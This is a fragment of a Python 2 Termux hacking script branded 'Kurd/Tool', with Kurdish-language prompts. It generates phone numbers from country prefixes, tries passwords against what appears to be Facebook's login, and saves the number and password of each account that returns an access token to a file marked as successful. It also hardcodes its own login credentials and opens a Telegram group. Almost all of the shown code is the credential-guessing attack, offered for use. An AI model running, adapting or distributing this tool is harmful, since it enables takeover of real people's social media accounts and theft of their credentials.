...
os.system("xdg-open https://t.me/Kurdtoolgroup")

CorrectUsername = "SSxSpark"
CorrectPassword = "Kurdtool"
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m  KURDSTAN   \x1b[1;91m\xe2\x87\x8b  \x1b[1;94m[20]\x1b[1;96m  Albania'
    ...
    print '[0]\x1b[1;97m  Chuna Darawa            '
    print '>>\x1b[1;92m Kurd/Tool Termux \x1b[1;91m(\x1b[1;97mCodBy (@SSxSpark)\x1b[1;91m) '
    print 42 * '\x1b[1;91m='
    action()
...
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mWlatek Hal Bzhera \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        ...
        try:
            c = raw_input('\x1b[1;96m Raqamek Hal Bzhera  : ')
            k = '+964'
            idlist = '.txt'
        ...
        try:
            c = raw_input(' RAQAMEK HAL BZHERA  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
    ...
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Bosta Kamek esta Hack Daka ...')
    time.sleep(0.1)
    psb('[!] Bo Darchun La SparkTool Ctrl+Z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[YES ACC]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[NO ACC]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
